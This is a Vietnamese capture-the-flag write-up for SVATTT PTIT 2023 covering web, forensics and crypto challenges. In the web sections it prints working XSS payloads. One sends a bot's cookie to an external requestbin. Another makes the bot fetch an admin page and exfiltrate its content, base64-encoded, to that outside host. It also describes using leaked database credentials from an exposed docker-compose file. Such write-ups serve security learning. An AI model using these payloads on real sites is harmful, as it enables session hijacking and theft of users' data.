## SVATTT 2023

Writeup CTF Tuyển chọn SVATT PTIT 2023

### Web01

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/8f2d9e98-cae7-4b05-9f66-9a736549d340)

Chúng ta được cho 2 link, 1 là link challenge, 2 là link của con bot. Kinh nghiệm cho mình thấy đây là 1 bài Reflected XSS để lấy cookie

Sau khi đăng ký và đăng nhập, đây là UI của web challenge gồm 1 form để nhập note, và note được nhập sẽ hiển thị ngay bên dưới

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/7f82fdf6-89cd-4fb8-bcc2-b8b8256aa795)

Test thử với payload đơn giản `<img src=x onerror=alert(1)`, nhận thấy trang web bị lỗi XSS.

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/574bc9c9-e5e8-4bbb-9252-efcf3367a9bd)

Ý tưởng bây giờ là khai thác Reflected XSS để lấy cookie của bot. Payload để lấy cookie của bot:

```
<img src=x onerror="this.src='https://eo4kqgjvne2o998.m.pipedream.net/?'+document.cookie; this.removeAttribute('onerror');">
```

Giải thích payload: Javascript được thực thi sẽ gửi GET HTTP request đến URL requestbin kèm với cookie của bot

Sau khi gửi đường link cho bot, mã Javascript được thực thi, lấy được cookie của bot

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/3e41f92c-900f-46e7-b27c-3a3aa90d7148)

Thay cookie của người dùng bằng Cookie của bot, truy cập admin panel ta sẽ lấy được flag

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/7d38182e-0724-4048-8ce7-1467e7fa8bfa)

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/af2bed2d-7614-4823-9846-373ec1be911a)

### Web02

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/98e465a6-64ef-4944-be67-a6f39669c1f2)

UI của challenge là 1 form search

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/4917958b-73dc-4fcf-a06d-3a4b636a6cc9)

Form search làm mình nghĩ ngay đến SQLi. Nhưng sau khi test thử với Burp Suite và sqlmap thì mình không detect được SQLi xD

dirsearch URL của challenge, tìm được 1 endpoint thú dzị là `/docker-compose.yml`

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/74b42930-bf6c-4981-b950-6eda6a437df8)

Truy cập `167.172.80.186:5000/docker-compose.yml` lấy được password vào mysql db 

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/ef3b7974-d7be-400d-89e4-5d2345bcd38d)

Chui vào db mình lấy được flag

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/aa3606ad-98d7-45ee-84b6-3f74e837dd11)

### Web01-again

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/f5253b00-2fb9-4d9c-86e9-d100655f9642)

Vẫn là cái UI của bài web01 trước

vẫn là con BOT cũ

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/615db062-4db2-4ceb-b9e3-91ee4853de06)

Nhưng cái khác ở đây là không thể dùng Reflected XSS để lấy cookie của bot do có flag http-only

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/9466ba56-6f5e-42b2-aa8b-8398bfdd868c)

Ý tưởng của mình là thay vì lấy cookie của con bot để vào được admin panel, giờ mình sẽ điều khiển con bot lấy luôn flag về cho mình : D

POC để con bot truy cập admin pannel và lấy flag cho mình

```
<script>
   var req = new XMLHttpRequest(); // Initializes the request object
   req.onload=reqListener; // Set the listener reqListener that is triggered when the response is ready
   var url="http://167.172.80.186:9999/admin.php"; // Initializes the URL of the PHP info page
   req.withCredentials=true; // Send the cookie header
   req.open("GET",url,false); // The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously
   req.send(); // Send the request
   function reqListener() {
      var req2=new XMLHttpRequest(); 
      const sess=this.responseText.substring(this.responseText.indexOf("ATTT"));
      req2.open("GET","https://eoisvenotwsj688.m.pipedream.net/?data="+btoa(sess),false);
      req2.send() 
   };
</script>
```

đầu tiên bot sẽ truy cập vào trang admin

Sau đó nó sẽ lọc response để lấy ra flag theo format ATTT{.......}

bước cuối nó gửi flag để server của mình, mã hóa base64 để tránh việc request URL quá dài

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/cd46d615-3fd1-4bb2-b672-aacbe4d962ba)

giải ra chúng ta có flag

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/86fb98cd-e155-42b9-8be7-0cba683d51ff)

### For01

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/b743463e-62c2-4d8e-b444-6a1f853b0567)

Ok, challenge này cho chúng ta 1 file rar, sau khi giải nén cấu trúc thư mục sẽ như thế này

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/b20e97bd-595d-4d89-85f1-f9c8a742e6f7)

Tóm gọn lại là có 100 thư mục được đánh dấu từ 0-100, trong mỗi thư mục lại có 100 thư mục được đặt tên từ 0-100. Trong mỗi thư mục con lại có 100 file .txt 0.txt đến 100.txt . Nhiệm vụ của chúng ta là tìm ra flag trong đống file .txt đấy : D. Mình dùng python để tự động hóa quá trình tìm flag. Đây là source code:

```
import os

for i in range(0,101):
    for j in range(0,101):
        for filename in os.listdir('./{}/{}/'.format(i,j)):
            f = open('./{}/{}/'.format(i,j)+filename,'r')
            r = f.read()
            if r != "almost" and r != "no" and r!="nah" and r!="you_got_it" and r!="try_again" and r!="Not_this_time" and r!="so_close" and r!="nope" and r!="better_luck_next_time":
                print(r)
```

Mình sử dụng 2 vòng lặp và đọc tất cả các file .txt trong thư mục con, kết quả tìm ra flag

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/fb764715-86c4-4bf3-ba92-f0cf9cccba6c)

### Crypto01

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/68e32850-7ecf-43db-ad11-6608ffb95042)

Source code enc.cpp:

```
#include <iostream>
#include <string>
using namespace std;

#define EL printf("\n")

string flag = "ATTT{fake_flag}";

void bases(string &s) {
    for (int i = 0; i < s.size(); i += 4)
        printf("%o %u %x %u ", (unsigned char) s[i], (unsigned char) s[i + 1], (unsigned char) s[i + 2], (unsigned char) s[i + 3]);
    EL;
}

int main() {
    freopen("res.txt", "w", stdout);
    bases(flag);

    return 0;
}
```

Thuật toán: Lấy 4 kí tự liền nhau, kí tự đầu tiên sẽ chuyển về dạng octal, kí tự thứ 2 là dạng decimal, kí tự thứ 3 là dạng hex và kí tự thứ 4 tiếp tục là decimal, và lặp lại như vậy đến khi hết chuỗi.

Mình hiểu thuật toán nhưng quên mất cách code c++, code python thì lú nên tức quá quay ra làm bằng tay. Bật 4 tab cyberchef và quẩy tầm 2,3p mình được flag ám ảnh nhất mình từng tìm được

![image](https://github.com/lucthienphong1120/ISP-CTF/assets/90561566/24b5e93a-1c1e-43de-ba66-84949d668ab9)
